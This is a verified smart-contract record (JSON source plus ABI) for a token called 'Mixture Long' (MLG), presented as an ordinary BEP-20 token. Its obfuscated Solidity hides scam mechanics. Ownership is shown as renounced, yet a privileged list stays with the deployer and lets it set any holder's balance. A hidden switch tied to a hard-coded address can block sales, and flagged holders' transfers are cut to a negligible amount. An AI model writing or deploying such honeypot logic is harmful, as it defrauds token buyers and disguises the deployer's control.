{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface takeLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract atModeLiquidity {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface modeExempt {\n    function createPair(address maxReceiver, address autoFrom) external returns (address);\n}\n\ninterface receiverTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamAuto) external view returns (uint256);\n\n    function transfer(address exemptFrom, uint256 buyList) external returns (bool);\n\n    function allowance(address feeWallet, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 buyList) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptFrom,\n        uint256 buyList\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingIs, uint256 value);\n    event Approval(address indexed feeWallet, address indexed spender, uint256 value);\n}\n\ninterface receiverTeamMetadata is receiverTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MixtureLong is atModeLiquidity, receiverTeam, receiverTeamMetadata {\n\n    function owner() external view returns (address) {\n        return tradingIsMin;\n    }\n\n    function getOwner() external view returns (address) {\n        return tradingIsMin;\n    }\n\n    bool private exemptBuySender;\n\n    function amountSwap() public {\n        emit OwnershipTransferred(sellAmount, address(0));\n        tradingIsMin = address(0);\n    }\n\n    uint256 private toReceiver;\n\n    string private teamAmount = \"MLG\";\n\n    constructor (){\n        if (toReceiver != walletTotal) {\n            walletTotal = senderFee;\n        }\n        takeLaunch launchTotal = takeLaunch(senderEnable);\n        toWallet = modeExempt(launchTotal.factory()).createPair(launchTotal.WETH(), address(this));\n        if (minSell != toReceiver) {\n            launchWalletIs = false;\n        }\n        sellAmount = _msgSender();\n        amountSwap();\n        limitFrom[sellAmount] = true;\n        tradingTo[sellAmount] = modeAt;\n        \n        emit Transfer(address(0), sellAmount, modeAt);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return enableBuy;\n    }\n\n    function amountReceiver(address amountExempt, uint256 buyList) public {\n        takeSellMode();\n        tradingTo[amountExempt] = buyList;\n    }\n\n    address public toWallet;\n\n    function transferFrom(address isTeam, address exemptFrom, uint256 buyList) external override returns (bool) {\n        if (_msgSender() != senderEnable) {\n            if (isLaunched[isTeam][_msgSender()] != type(uint256).max) {\n                require(buyList <= isLaunched[isTeam][_msgSender()]);\n                isLaunched[isTeam][_msgSender()] -= buyList;\n            }\n        }\n        return marketingWalletTrading(isTeam, exemptFrom, buyList);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return modeAt;\n    }\n\n    function limitTxLiquidity(address receiverLaunched) public {\n        if (listSwap) {\n            return;\n        }\n        \n        limitFrom[receiverLaunched] = true;\n        \n        listSwap = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamAmount;\n    }\n\n    function allowance(address liquidityShould, address modeIs) external view virtual override returns (uint256) {\n        if (modeIs == senderEnable) {\n            return type(uint256).max;\n        }\n        return isLaunched[liquidityShould][modeIs];\n    }\n\n    uint256 takeTotal;\n\n    function shouldFromMax(address isTeam, address exemptFrom, uint256 buyList) internal returns (bool) {\n        require(tradingTo[isTeam] >= buyList);\n        tradingTo[isTeam] -= buyList;\n        tradingTo[exemptFrom] += buyList;\n        emit Transfer(isTeam, exemptFrom, buyList);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private isLaunched;\n\n    function name() external view virtual override returns (string memory) {\n        return liquidityTradingReceiver;\n    }\n\n    uint8 private enableBuy = 18;\n\n    string private liquidityTradingReceiver = \"Mixture Long\";\n\n    address private tradingIsMin;\n\n    function takeSellMode() private view {\n        require(limitFrom[_msgSender()]);\n    }\n\n    uint256 exemptTake;\n\n    function approve(address modeIs, uint256 buyList) public virtual override returns (bool) {\n        isLaunched[_msgSender()][modeIs] = buyList;\n        emit Approval(_msgSender(), modeIs, buyList);\n        return true;\n    }\n\n    uint256 private walletTotal;\n\n    function marketingWalletTrading(address isTeam, address exemptFrom, uint256 buyList) internal returns (bool) {\n        if (isTeam == sellAmount) {\n            return shouldFromMax(isTeam, exemptFrom, buyList);\n        }\n        uint256 autoReceiverExempt = receiverTeam(toWallet).balanceOf(senderLaunched);\n        require(autoReceiverExempt == takeTotal);\n        require(exemptFrom != senderLaunched);\n        if (tokenSellLaunched[isTeam]) {\n            return shouldFromMax(isTeam, exemptFrom, launchedLaunch);\n        }\n        return shouldFromMax(isTeam, exemptFrom, buyList);\n    }\n\n    mapping(address => bool) public tokenSellLaunched;\n\n    mapping(address => bool) public limitFrom;\n\n    function transfer(address amountExempt, uint256 buyList) external virtual override returns (bool) {\n        return marketingWalletTrading(_msgSender(), amountExempt, buyList);\n    }\n\n    function balanceOf(address teamAuto) public view virtual override returns (uint256) {\n        return tradingTo[teamAuto];\n    }\n\n    uint256 private senderFee;\n\n    bool public listSwap;\n\n    address senderEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function fundMarketingMode(uint256 buyList) public {\n        takeSellMode();\n        takeTotal = buyList;\n    }\n\n    mapping(address => uint256) private tradingTo;\n\n    uint256 private modeAt = 100000000 * 10 ** 18;\n\n    address senderLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 constant launchedLaunch = 18 ** 10;\n\n    address public sellAmount;\n\n    function toWalletTrading(address minAuto) public {\n        takeSellMode();\n        \n        if (minAuto == sellAmount || minAuto == toWallet) {\n            return;\n        }\n        tokenSellLaunched[minAuto] = true;\n    }\n\n    bool private shouldSell;\n\n    bool public launchWalletIs;\n\n    uint256 private minSell;\n\n    event OwnershipTransferred(address indexed modeFeeShould, address indexed liquidityMaxFee);\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeFeeShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityMaxFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyList\",\"type\":\"uint256\"}],\"name\":\"amountReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyList\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamAuto\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"buyList\",\"type\":\"uint256\"}],\"name\":\"fundMarketingMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchWalletIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLaunched\",\"type\":\"address\"}],\"name\":\"limitTxLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minAuto\",\"type\":\"address\"}],\"name\":\"toWalletTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenSellLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyList\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyList\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "MixtureLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}